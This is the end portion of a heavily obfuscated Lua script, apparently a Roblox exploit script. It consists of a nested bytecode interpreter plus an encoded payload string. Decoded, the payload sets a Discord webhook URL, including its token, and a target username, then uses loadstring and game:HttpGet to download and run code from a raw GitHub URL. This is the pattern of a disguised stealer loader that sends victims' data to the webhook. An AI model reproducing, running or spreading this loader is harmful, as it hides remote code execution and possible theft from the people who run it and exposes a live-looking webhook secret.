																																																	if (v380 == 0) then
																																																		v355 = v254[v352];
																																																		return v355[(1753 - (76 + 139)) - ((579 - 310) + (2121 - (103 + 750)))][v355[1671 - ((6921 - 5498) + 71 + 175)]];
																																																	end
																																																end
																																															end
																																														end
																																														break;
																																													end
																																												end
																																											end,[v7("\8\8\112\133\190\195\162\51\50\102", "\87\87\30\224\201\170\204")]=function(v356, v357, v358)
																																												local v359 = 0;
																																												local v360;
																																												local v361;
																																												while true do
																																													if (v359 == 1) then
																																														while true do
																																															if (0 == v360) then
																																																v361 = v254[v357];
																																																v361[(2861 - (25 + 1378)) - (379 + 88 + 990)][v361[(1671 - (743 + 922)) - (11 - 7)]] = v358;
																																																break;
																																															end
																																														end
																																														break;
																																													end
																																													if (0 == v359) then
																																														v360 = 0;
																																														v361 = nil;
																																														v359 = 1;
																																													end
																																												end
																																											end});
																																											v309 = 1;
																																										end
																																										if (v309 == 1) then
																																											v251 = 2;
																																											break;
																																										end
																																									end
																																								end
																																								if (v251 == 2) then
																																									for v326 = 1, v193[12 - 8] do
																																										local v327 = 0;
																																										local v328;
																																										local v329;
																																										while true do
																																											if (v327 == 1) then
																																												while true do
																																													if (1 == v328) then
																																														if (v329[277 - (21 + 255)] == (18 - 12)) then
																																															v254[v326 - ((501 - (96 + 404)) + (0 - 0))] = {v191,v329[1 + 2]};
																																														else
																																															v254[v326 - (1 - 0)] = {v93,v329[(6 - 4) + (2 - 1)]};
																																														end
																																														v190[#v190 + (2 - 1) + 0] = v254;
																																														break;
																																													end
																																													if (0 == v328) then
																																														local v369 = 0;
																																														while true do
																																															if (v369 == 0) then
																																																v160 = v160 + 1;
																																																v329 = v185[v160];
																																																v369 = 1;
																																															end
																																															if (v369 == 1) then
																																																v328 = 1;
																																																break;
																																															end
																																														end
																																													end
																																												end
																																												break;
																																											end
																																											if (v327 == 0) then
																																												v328 = 0;
																																												v329 = nil;
																																												v327 = 1;
																																											end
																																										end
																																									end
																																									v191[v193[1237 - (899 + 336)]] = v43(v252, v253, v94);
																																									break;
																																								end
																																							end
																																							break;
																																						end
																																						if (v250 == 0) then
																																							v251 = 0;
																																							v252 = nil;
																																							v250 = 1;
																																						end
																																					end
																																				end
																																			elseif (v194 <= 12) then
																																				if (v194 == 11) then
																																					v191[v193[(8 - 2) - 4]] = #v191[v193[3 + 0]];
																																				else
																																					local v256 = 0;
																																					local v257;
																																					local v258;
																																					while true do
																																						if (v256 == 0) then
																																							v257 = 0;
																																							v258 = nil;
																																							v256 = 1;
																																						end
																																						if (v256 == 1) then
																																							while true do
																																								if (v257 == 0) then
																																									v258 = v193[1 + 0 + 1];
																																									do
																																										return v21(v191, v258, v161);
																																									end
																																									break;
																																								end
																																							end
																																							break;
																																						end
																																					end
																																				end
																																			elseif (v194 == (1623 - (125 + 100 + 1385))) then
																																				v191[v193[5 - 3]] = v193[(7 - 4) + (1282 - (666 + 616))] ~= 0;
																																			else
																																				v191[v193[3 - 1]] = v93[v193[2 + 1]];
																																			end
																																		elseif (v194 <= 21) then
																																			if (v194 <= ((413 + 1183) - (569 + 1010))) then
																																				if (v194 <= (1 + 14)) then
																																					v94[v193[4 - 1]] = v191[v193[4 - 2]];
																																				elseif (v194 > (44 - 28)) then
																																					v191[v193[1450 - (1320 + 128)]] = v94[v193[(1895 - (1746 + 143)) - (4 - 1)]];
																																				else
																																					local v264 = 0;
																																					local v265;
																																					local v266;
																																					local v267;
																																					local v268;
																																					while true do
																																						if (v264 == 2) then
																																							while true do
																																								if (v265 == 1) then
																																									v268 = v191[v266 + 2];
																																									if (v268 > (1481 - (1117 + 364))) then
																																										if (v267 > v191[v266 + ((2759 - (85 + 1226)) - (22 + 620 + 43 + 762))]) then
																																											v160 = v193[14 - 11];
																																										else
																																											v191[v266 + ((1441 - (536 + 222)) - ((266 - (120 + 141)) + (1034 - 359)))] = v267;
																																										end
																																									elseif (v267 < v191[v266 + (1081 - ((2304 - (1556 + 15)) + (1220 - (589 + 284))))]) then
																																										v160 = v193[3 + 0];
																																									else
																																										v191[v266 + ((30 - 23) - (3 + 1))] = v267;
																																									end
																																									break;
																																								end
																																								if (v265 == 0) then
																																									local v313 = 0;
																																									while true do
																																										if (v313 == 0) then
																																											v266 = v193[(1 - 0) + (836 - (644 + 191))];
																																											v267 = v191[v266];
																																											v313 = 1;
																																										end
																																										if (v313 == 1) then
																																											v265 = 1;
																																											break;
																																										end
																																									end
																																								end
																																							end
																																							break;
																																						end
																																						if (v264 == 1) then
																																							v267 = nil;
																																							v268 = nil;
																																							v264 = 2;
																																						end
																																						if (v264 == 0) then
																																							v265 = 0;
																																							v266 = nil;
																																							v264 = 1;
																																						end
																																					end
																																				end
																																			elseif (v194 <= (15 + 4)) then
																																				if (v194 > 18) then
																																					local v269 = 0;
																																					local v270;
																																					local v271;
																																					local v272;
																																					local v273;
																																					local v274;
																																					while true do
																																						if (0 == v269) then
																																							v270 = 0;
																																							v271 = nil;
																																							v269 = 1;
																																						end
																																						if (2 == v269) then
																																							v274 = nil;
																																							while true do
																																								if (v270 == 2) then
																																									for v330 = v271, v161 do
																																										local v331 = 0;
																																										local v332;
																																										while true do
																																											if (v331 == 0) then
																																												v332 = 0;
																																												while true do
																																													if (v332 == 0) then
																																														v274 = v274 + 1 + (372 - (127 + 245));
																																														v191[v330] = v272[v274];
																																														break;
																																													end
																																												end
																																												break;
																																											end
																																										end
																																									end
																																									break;
																																								end
																																								if (v270 == 1) then
																																									local v314 = 0;
																																									while true do
																																										if (v314 == 0) then
																																											v161 = (v273 + v271) - 1;
																																											v274 = 733 - (305 + 428);
																																											v314 = 1;
																																										end
																																										if (v314 == 1) then
																																											v270 = 2;
																																											break;
																																										end
																																									end
																																								end
																																								if (v270 == 0) then
																																									local v315 = 0;
																																									while true do
																																										if (v315 == 1) then
																																											v270 = 1;
																																											break;
																																										end
																																										if (v315 == 0) then
																																											v271 = v193[(3101 - 1829) - ((1738 - (202 + 449)) + 38 + 145)];
																																											v272, v273 = v188(v191[v271](v21(v191, v271 + ((1 + 1) - (1 + 0)), v193[1 + 2])));
																																											v315 = 1;
																																										end
																																									end
																																								end
																																							end
																																							break;
																																						end
																																						if (v269 == 1) then
																																							v272 = nil;
																																							v273 = nil;
																																							v269 = 2;
																																						end
																																					end
																																				else
																																					do
																																						return;
																																					end
																																				end
																																			elseif (v194 > 20) then
																																				v191[v193[1132 - (775 + 355)]] = v193[3 + 0];
																																			else
																																				local v277 = 0;
																																				local v278;
																																				local v279;
																																				while true do
																																					if (v277 == 1) then
																																						while true do
																																							if (v278 == 0) then
																																								v279 = v193[1 + 0 + 1];
																																								v191[v279](v21(v191, v279 + (605 - (72 + 532)), v161));
																																								break;
																																							end
																																						end
																																						break;
																																					end
																																					if (v277 == 0) then
																																						v278 = 0;
																																						v279 = nil;
																																						v277 = 1;
																																					end
																																				end
																																			end
																																		elseif (v194 <= ((1366 - (838 + 481)) - (13 + 9))) then
																																			if (v194 <= 23) then
																																				if (v194 == (1812 - (45 + 1745))) then
																																					v191[v193[3 - 1]] = v191[v193[3]] % v191[v193[4]];
																																				else
																																					local v281 = 0;
																																					local v282;
																																					local v283;
																																					while true do
																																						if (v281 == 1) then
																																							while true do
																																								if (v282 == 0) then
																																									v283 = v193[1 + 1];
																																									v191[v283] = v191[v283](v21(v191, v283 + (1464 - (238 + 1225)) + (0 - 0), v161));
																																									break;
																																								end
																																							end
																																							break;
																																						end
																																						if (v281 == 0) then
																																							v282 = 0;
																																							v283 = nil;
																																							v281 = 1;
																																						end
																																					end
																																				end
																																			elseif (v194 > (1995 - (592 + 1379))) then
																																				local v284 = 0;
																																				local v285;
																																				local v286;
																																				local v287;
																																				local v288;
																																				local v289;
																																				while true do
																																					if (v284 == 0) then
																																						v285 = 0;
																																						v286 = nil;
																																						v284 = 1;
																																					end
																																					if (v284 == 1) then
																																						v287 = nil;
																																						v288 = nil;
																																						v284 = 2;
																																					end
																																					if (v284 == 2) then
																																						v289 = nil;
																																						while true do
																																							if (v285 == 2) then
																																								for v333 = v286, v161 do
																																									local v334 = 0;
																																									local v335;
																																									while true do
																																										if (v334 == 0) then
																																											v335 = 0;
																																											while true do
																																												if (v335 == 0) then
																																													v289 = v289 + (436 - (353 + 82));
																																													v191[v333] = v287[v289];
																																													break;
																																												end
																																											end
																																											break;
																																										end
																																									end
																																								end
																																								break;
																																							end
																																							if (v285 == 1) then
																																								local v319 = 0;
																																								while true do
																																									if (v319 == 1) then
																																										v285 = 2;
																																										break;
																																									end
																																									if (v319 == 0) then
																																										v161 = (v288 + v286) - 1;
																																										v289 = 0;
																																										v319 = 1;
																																									end
																																								end
																																							end
																																							if (v285 == 0) then
																																								local v320 = 0;
																																								while true do
																																									if (v320 == 1) then
																																										v285 = 1;
																																										break;
																																									end
																																									if (v320 == 0) then
																																										v286 = v193[2 + (1867 - (222 + 1645))];
																																										v287, v288 = v188(v191[v286](v21(v191, v286 + 1 + 0, v161)));
																																										v320 = 1;
																																									end
																																								end
																																							end
																																						end
																																						break;
																																					end
																																				end
																																			else
																																				v191[v193[1888 - (1847 + 39)]] = v191[v193[(17 + 33) - (21 + (1950 - (476 + 1448)))]] + v193[(1419 - 1029) - (25 + 79 + 282)];
																																			end
																																		elseif (v194 <= ((1443 - (187 + 1240)) + 3 + 8)) then
																																			if (v194 == (38 - (18 - 6))) then
																																				v191[v193[1 + (4 - 3)]] = v193[2 + 1] + v191[v193[4]];
																																			else
																																				local v292 = 0;
																																				local v293;
																																				local v294;
																																				while true do
																																					if (v292 == 1) then
																																						while true do
																																							if (v293 == 0) then
																																								v294 = v193[8 - 6];
																																								v191[v294] = v191[v294](v21(v191, v294 + (1 - 0), v193[3]));
																																								break;
																																							end
																																						end
																																						break;
																																					end
																																					if (v292 == 0) then
																																						v293 = 0;
																																						v294 = nil;
																																						v292 = 1;
																																					end
																																				end
																																			end
																																		elseif (v194 > ((1397 - 431) - ((2142 - (647 + 916)) + 359))) then
																																			v191[v193[1818 - (854 + 962)]]();
																																		else
																																			v191[v193[(4 + 2) - 4]] = v191[v193[3]] % v193[(858 - (157 + 694)) - (2 + 1)];
																																		end
																																		v160 = v160 + 1 + 0;
																																		break;
																																	end
																																	if (v201 == 0) then
																																		local v214 = 0;
																																		while true do
																																			if (v214 == 0) then
																																				v193 = v185[v160];
																																				v194 = v193[(1 - 0) + 0];
																																				v214 = 1;
																																			end
																																			if (v214 == 1) then
																																				v201 = 1;
																																				break;
																																			end
																																		end
																																	end
																																end
																																break;
																															end
																														end
																													end
																													break;
																												end
																											end
																										end
																										v174 = 1;
																									end
																								end
																							end
																							if (v159 == 0) then
																								local v175 = 0;
																								while true do
																									if (v175 == 1) then
																										v159 = 1;
																										break;
																									end
																									if (v175 == 0) then
																										v160 = (2138 - (615 + 646)) - ((1128 - 671) + 419);
																										v161 = -(1408 - (945 + (1170 - (470 + 238))));
																										v175 = 1;
																									end
																								end
																							end
																						end
																						break;
																					end
																				end
																			end;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
												if (v95 == 1) then
													v98 = nil;
													v99 = nil;
													v95 = 2;
												end
												if (v95 == 0) then
													v96 = 0;
													v97 = nil;
													v95 = 1;
												end
											end
										end
										return v43(v42(), {}, v29)(...);
									end
								end
							end
							v45 = 3;
						end
					end
				end
				break;
			end
			if (v30 == 1) then
				v35 = nil;
				v36 = nil;
				v37 = nil;
				v38 = nil;
				v30 = 2;
			end
			if (v30 == 0) then
				v31 = 0;
				v32 = nil;
				v33 = nil;
				v34 = nil;
				v30 = 1;
			end
			if (v30 == 2) then
				v39 = nil;
				v40 = nil;
				v41 = nil;
				v42 = nil;
				v30 = 3;
			end
		end
	end
	v23("LOL!133O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403083O00557365724E616D65030A3O000F5A17D0CD7F3539521E03073O004B337AB1A61E6A03073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3130393230362O30382O3938363331383431362F5453596D694539694D35314F2D632O5374424A7441374753456674645476737477685978436570773961417649506D7151793731787533492D6C41425F75434963504E73030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403323O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F507378302F412F6D61696E2F6D61696E00263O0012113O00013O00206O0002001211000100013O00202O000100010003001211000200013O00202O000200020004001211000300053O0006070003000A000100010004033O000A0001001211000300063O00202O000400030007001211000500083O00202O000500050009001211000600083O00202O00060006000A00060A00073O000100062O00063O00064O00068O00063O00044O00063O00014O00063O00024O00063O00054O0006000800073O0012150009000C3O001215000A000D4O001B0008000A000200120F0008000B3O0012150008000F3O00120F0008000E3O001211000800103O001211000900113O002008000900090012001215000B00134O000D000C00014O00130009000C4O001700083O00022O001D0008000100012O00123O00013O00013O00023O00026O00F03F026O00704002284O000400025O001215000300014O000B00045O001215000500013O0004100003002300012O000E00076O0006000800024O000E000900014O000E000A00024O000E000B00034O000E000C00044O0006000D6O0006000E00063O002018000F000600012O0013000C000F4O0017000B3O00022O000E000C00034O000E000D00044O0006000E00013O002001000F000600012O000B001000014O0016000F000F001000101A000F0001000F0020010010000600012O000B001100014O001600100010001100101A0010000100100020180010001000012O0013000D00104O0019000C6O0017000A3O000200201C000A000A00022O00050009000A4O001400073O00010004090003000500012O000E000300054O0006000400024O0002000300044O000C00036O00123O00017O00283O00093O000A3O000A3O000A3O000A3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000B3O000A3O000D3O000D3O000D3O000D3O000E3O00263O00013O00013O00023O00023O00033O00033O00043O00043O00043O00043O00053O00063O00063O00073O00073O000E3O000E3O000E3O000E3O000E3O000E3O000E3O000F3O000F3O000F3O000F3O000F3O00103O00103O00113O00113O00113O00113O00113O00113O00113O00113O00113O00", v17(), ...);
end
